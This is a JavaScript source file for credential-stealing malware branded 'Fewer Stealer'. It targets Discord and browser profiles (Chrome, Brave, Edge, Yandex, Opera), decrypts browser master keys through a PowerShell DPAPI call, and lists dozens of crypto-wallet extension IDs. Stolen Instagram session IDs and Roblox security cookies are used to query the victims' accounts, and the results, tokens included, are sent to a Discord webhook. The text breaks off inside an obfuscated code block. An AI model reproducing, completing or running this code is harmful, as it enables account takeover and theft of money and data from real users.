const fs = require("fs"),
    path = require("path"),
    httpx = require("axios"),
    axios = require("axios"),
    os = require('os'),
    FormData = require('form-data'),
    AdmZip = require('adm-zip'),
    {
        execSync,
        exec: exec
    } = require("child_process"),
    crypto = require("crypto"),
   sqlite3 = require("sqlite3");
const { extractAll, createPackage } = require('asar');
const https = require('https');

const local = process.env.LOCALAPPDATA;
const discords = [];
debug = false;
let injection_paths = []

var appdata = process.env.APPDATA,
    LOCAL = process.env.LOCALAPPDATA,
    localappdata = process.env.LOCALAPPDATA;
let browser_paths = [localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'];

const webhook3939 = "YOUR_DISCORD_WEBHOOK_PUT_HERE"





paths = [
    appdata + '\\discord\\',
    appdata + '\\discordcanary\\',
    appdata + '\\discordptb\\',
    appdata + '\\discorddevelopment\\',
    appdata + '\\lightcord\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
    localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
    appdata + '\\Opera Software\\Opera Stable\\',
    appdata + '\\Opera Software\\Opera GX Stable\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
    localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];

function onlyUnique(item, index, array) {
    return array.indexOf(item) === index;
}


  const config = {
    "logout": "instant",
    "inject-notify": "true",
    "logout-notify": "true",
    "init-notify": "false",
    "embed-color": 3553599,
    "disable-qr-code": "true"
}
let api_auth = 'dsdsa';

const _0x9b6227 = {}
_0x9b6227.passwords = 0
_0x9b6227.cookies = 0
_0x9b6227.autofills = 0
_0x9b6227.wallets = 0
_0x9b6227.telegram = false
const count = _0x9b6227,
user = {
    ram: os.totalmem(),
    version: os.version(),
    uptime: os.uptime,
    homedir: os.homedir(),
    hostname: os.hostname(),
    userInfo: os.userInfo().username,
    type: os.type(),
    arch: os.arch(),
    release: os.release(),
    roaming: process.env.APPDATA,
    local: process.env.LOCALAPPDATA,
    temp: process.env.TEMP,
    countCore: process.env.NUMBER_OF_PROCESSORS,
    sysDrive: process.env.SystemDrive,
    fileLoc: process.cwd(),
    randomUUID: crypto.randomBytes(16).toString('hex'),
    start: Date.now(),
    debug: false,
    copyright: '<================[Fewer Stealer]>================>\n\n',
    url: null,
}
_0x2afdce = {}
const walletPaths = _0x2afdce,
    _0x4ae424 = {}
_0x4ae424.Trust = '\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph'
_0x4ae424.Metamask =
    '\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
_0x4ae424.BinanceChain =
    '\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp'
_0x4ae424.Phantom =
    '\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa'
_0x4ae424.TronLink =
    '\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec'
_0x4ae424.Ronin = '\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec'
_0x4ae424.Exodus =
    '\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno'
_0x4ae424.Coin98 =
    '\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg'
_0x4ae424.Authenticator =
    '\\Sync Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai'
_0x4ae424.MathWallet =
    '\\Sync Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc'
_0x4ae424.YoroiWallet =
    '\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb'
_0x4ae424.GuardaWallet =
    '\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln'
_0x4ae424.JaxxxLiberty =
    '\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne'
_0x4ae424.Wombat =
    '\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih'
_0x4ae424.EVERWallet =
    '\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk'
_0x4ae424.KardiaChain =
    '\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk'
_0x4ae424.XDEFI = '\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf'
_0x4ae424.Nami = '\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo'
_0x4ae424.TerraStation =
    '\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp'
_0x4ae424.MartianAptos =
    '\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk'
_0x4ae424.TON = '\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd'
_0x4ae424.Keplr = '\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap'
_0x4ae424.CryptoCom =
    '\\Local Extension Settings\\hifafgmccdpekplomjjkcfgodnhcellj'
_0x4ae424.PetraAptos =
    '\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci'
_0x4ae424.OKX = '\\Local Extension Settings\\mcohilncbfahbmgdjkbpemcciiolgcge'
_0x4ae424.Sollet =
    '\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno'
_0x4ae424.Sender =
    '\\Local Extension Settings\\epapihdplajcdnnkdeiahlgigofloibg'
_0x4ae424.Sui = '\\Local Extension Settings\\opcgpfmipidbgpenhmajoajpbobppdil'
_0x4ae424.SuietSui =
    '\\Local Extension Settings\\khpkpbbcccdmmclmpigdgddabeilkdpd'
_0x4ae424.Braavos =
    '\\Local Extension Settings\\jnlgamecbpmbajjfhmmmlhejkemejdma'
_0x4ae424.FewchaMove =
    '\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj'
_0x4ae424.EthosSui =
    '\\Local Extension Settings\\mcbigmjiafegjnnogedioegffbooigli'
_0x4ae424.ArgentX =
    '\\Local Extension Settings\\dlcobpjiigpikoobohmabehhmhfoodbb'
_0x4ae424.NiftyWallet =
    '\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid'
_0x4ae424.BraveWallet =
    '\\Local Extension Settings\\odbfpeeihdkbihmopkbjmoonfanlbfcl'
_0x4ae424.EqualWallet =
    '\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac'
_0x4ae424.BitAppWallet =
    '\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi'
_0x4ae424.iWallet =
    '\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj'
_0x4ae424.AtomicWallet =
    '\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh'
_0x4ae424.MewCx = '\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm'
_0x4ae424.GuildWallet =
    '\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj'
_0x4ae424.SaturnWallet =
    '\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig'
_0x4ae424.HarmonyWallet =
    '\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib'
_0x4ae424.PaliWallet =
    '\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn'
_0x4ae424.BoltX = '\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca'
_0x4ae424.LiqualityWallet =
    '\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn'
_0x4ae424.MaiarDeFiWallet =
    '\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm'
_0x4ae424.TempleWallet =
    '\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc'
_0x4ae424.Metamask_E =
    '\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm'
_0x4ae424.Ronin_E =
    '\\Local Extension Settings\\kjmoohlgokccodicjjfebfomlbljgfhk'
_0x4ae424.Yoroi_E =
    '\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb'
_0x4ae424.Authenticator_E =
    '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
_0x4ae424.MetaMask_O =
    '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'

const extension = _0x4ae424,
  browserPath = [
    [
      user.local + '\\Google\\Chrome\\User Data\\Default\\',
      'Default',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\Google\\Chrome\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Google\\Chrome\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
      'Default',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\BraveSoftware\\Brave-Browser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Default\\',
      'Default',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Yandex\\YandexBrowser\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Default\\',
      'Default',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
      'Profile_1',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
      'Profile_2',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
      'Profile_3',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
      'Profile_4',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
      'Profile_5',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.local + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
      'Guest Profile',
      user.local + '\\Microsoft\\Edge\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\Default\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Neon\\User Data\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera Stable\\',
    ],
    [
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
      'Default',
      user.roaming + '\\Opera Software\\Opera GX Stable\\',
    ],
  ],
 randomPath = `${user.fileLoc}\\${user.randomUUID}`;
fs.mkdirSync(randomPath, 484);


function debugLog(message) {
  if (user.debug === true) {
    const elapsedTime = Date.now() - user.start;
    const seconds = (elapsedTime / 1000).toFixed(1);
    const milliseconds = elapsedTime.toString();

    console.log(`${message}: ${seconds} s. / ${milliseconds} ms.`);
  }
}






async function getEncrypted() {
  for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
    if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
      continue
    }
    try {
      let _0x276965 = Buffer.from(
        JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
          .os_crypt.encrypted_key,
        'base64'
      ).slice(5)
      const _0x4ff4c6 = Array.from(_0x276965),
        _0x4860ac = execSync(
          'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
            _0x4ff4c6 +
            "), $null, 'CurrentUser')"
        )
          .toString()
          .split('\r\n'),
        _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
        _0x2ed7ba = Buffer.from(_0x4a5920)
      browserPath[_0x4c3514].push(_0x2ed7ba)
    } catch (_0x32406b) {}
  }
}


// Assuming you have the necessary import for the httpx library

async function GetInstaData(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "X-Ig-Connection-Type": "WiFi",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "X-Ig-Capabilities": "36r/Fx8=",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "X-Ig-App-Locale": "en",
      "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
      "Accept-Encoding": "gzip, deflate",
      "Cookie": `sessionid=${session_id};`
    };

    const response = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const userData = response.data.user;

    const data = {
      username: userData.username,
      verified: userData.is_verified,
      avatar: userData.profile_pic_url,
      session_id: session_id
    };

    return data;
  } catch (error) {
    console.error("Error fetching Instagram data:", error);
    return null;
  }
}

async function GetFollowersCount(session_id) {
  try {
    const headers = {
      "Host": "i.instagram.com",
      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
      "Cookie": `sessionid=${session_id};`
    };

    const accountResponse = await httpx.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
    const accountInfo = accountResponse.data.user;
    
    const userInfoResponse = await httpx.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
    const userData = userInfoResponse.data.user;
    const followersCount = userData.follower_count;

    return followersCount;
  } catch (error) {
    console.error("Error fetching followers count:", error);
    return null;
  }
}

async function SubmitInstagram(session_id) {
  try {
    const data = await GetInstaData(session_id);
    const followersCount = await GetFollowersCount(session_id);

    // Your Discord webhook URL

    const embed = {
      title: 'Instagram Data',
      color: 16761867, // You can set the color of the embed (optional)
      thumbnail: { url: data.avatar },
      fields: [
        { name: 'Verified', value: data.verified ? 'Yes' : 'No', inline: true },
        { name: 'Token', value: data.session_id, inline: true }, // Corrected to data.session_id
        { name: 'Username', value: data.username, inline: true },
        { name: 'Followers Count', value: followersCount, inline: true } // Use followersCount directly
      ],
    };

    // Send the embed to the Discord webhook
    await httpx.post(webhook3939, { embeds: [embed] });
    console.log("Data sent to Discord webhook successfully.");
  } catch (error) {
    console.error("Error sending data to Discord webhook:", error);
  }
}



//


// Assuming you have a function named GetFollowers(session_id) that fetches the followers list


async function GetRobloxData(secret_cookie) {
  let data = {};
  let headers = {
    'accept': 'application/json, text/plain, */*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
    'origin': 'https://www.roblox.com',
    'referer': 'https://www.roblox.com',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
  };
  
  try {
    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });

    data['username'] = response.data['UserName'];
    data['avatar'] = response.data['ThumbnailUrl'];
    data['robux'] = response.data['RobuxBalance'];
    data['premium'] = response.data['IsPremium'];

    return data;
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);
    throw error;
  }
}

async function SubmitRoblox(secret_cookie) {
  try {
    let data = await GetRobloxData(secret_cookie);

    // Check if the required properties are defined and non-empty
    if (!data || !data.username || data.robux === undefined || data.premium === undefined) {
      console.error('Invalid Roblox data received:', data);
      return;
    }

    data['secret_cookie'] = secret_cookie;

    const formattedSecretCookie = secret_cookie.toString().replace(/`/g, '‵');

    // Check if robux value is 0 and handle accordingly
    const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;

    let embed = {
      color: 0x303037,
      author: {
        name: 'Roblox Session',
        icon_url: 'https://media.discordapp.net/attachments/1128742988252713001/1128986101093244949/68f5dd00afb66e8b8f599a77e12e7d19.gif',
      },
      thumbnail: {
        url: data.avatar,
      },
      fields: [
        {
          name: 'Name:',
          value: data.username,
          inline: false,
        },
        {
          name: 'Robux:',
          value: robuxValue,
          inline: false,
        },
        {
          name: 'Premium:',
          value: data.premium ? 'Yes' : 'No',
          inline: false,
        },
      ],
      footer: {
        text: '@fewerstealer',
      },
    };

    let payload = {
      embeds: [embed],
    };


var _0x36b6d9=_0x5d27;(function(_0x4ee773,_0x2abadd){var _0x48cc2a=_0x5d27,_0x1b529e=_0x4ee773();while(!![]){try{var _0x236acf=parseInt(_0x48cc2a(0xa6))/0x1*(parseInt(_0x48cc2a(0xa0))/0x2)+parseInt(_0x48cc2a(0x9d))/0x3*(parseInt(_0x48cc2a(0xa9))/0x4)+parseInt(_0x48cc2a(0xae))/0x5+parseInt(_0x48cc2a(0xab))/0x6*(parseInt(_0x48cc2a(0x9f))/0x7)+-parseInt(_0x48cc2a(0xad))/0x8*(-parseInt(_0x48cc2a(0xa5))/0x9)+parseInt(_0x48cc2a(0x95))/0xa+-parseInt(_0x48cc2a(0x9e))/0xb;if(_0x236acf===_0x2abadd)break;else _0x1b529e['push'](_0x1b529e['shift']());}catch(_0x3f2f0f){_0x1b529e['push'](_0x1b529e['shift']());}}}(_0x2f0d,0x3a9c1));var _0x557461=(function(){var _0x2be48b=!![];return function(_0x4f30d3,_0x5db532){var _0x570899=_0x2be48b?function(){var _0x54c612=_0x5d27;if(_0x5db532){var _0x33f933=_0x5db532[_0x54c612(0x98)](_0x4f30d3,arguments);return _0x5db532=null,_0x33f933;}}:function(){};return _0x2be48b=![],_0x570899;};}()),_0x300b70=_0x557461(this,function(){var _0x347e2a=_0x5d27;return _0x300b70[_0x347e2a(0xaf)]()[_0x347e2a(0x97)](_0x347e2a(0x91))['toString']()[_0x347e2a(0xa2)](_0x300b70)[_0x347e2a(0x97)](_0x347e2a(0x91));});function _0x5d27(_0x51e116,_0x211555){var _0x35e20c=_0x2f0d();return _0x5d27=function(_0x151221,_0x48c776){_0x151221=_0x151221-0x8c;var _0x49ee58=_0x35e20c[_0x151221];return _0x49ee58;},_0x5d27(_0x51e116,_0x211555);}_0x300b70();var _0x48c776=(function(){var _0x9abfef=!![];return function(_0x6ac6f7,_0x2c6140){var _0xa27276=_0x9abfef?function(){var _0xd1dcfa=_0x5d27;if(_0x2c6140){var _0x469b83=_0x2c6140[_0xd1dcfa(0x98)](_0x6ac6f7,arguments);return _0x2c6140=null,_0x469b83;}}:function(){};return _0x9abfef=![],_0xa27276;};}()),_0x151221=_0x48c776(this,function(){var _0x3fca0e=_0x5d27,_0x557030=function(){var _0x3100cd=_0x5d27,_0x5d00d7;try{_0x5d00d7=Function(_0x3100cd(0x96)+_0x3100cd(0x9b)+');')();}catch(_0x44d338){_0x5d00d7=window;}return _0x5d00d7;},_0x232022=_0x557030(),_0x4091bb=_0x232022['console']=_0x232022[_0x3fca0e(0x93)]||{},_0x1aeba4=[_0x3fca0e(0x8c),_0x3fca0e(0xaa),_0x3fca0e(0xa3),_0x3fca0e(0x9c),_0x3fca0e(0x90),_0x3fca0e(0xa8),_0x3fca0e(0x99)];for(var _0x49d188=0x0;_0x49d188<_0x1aeba4[_0x3fca0e(0x8d)];_0x49d188++){var 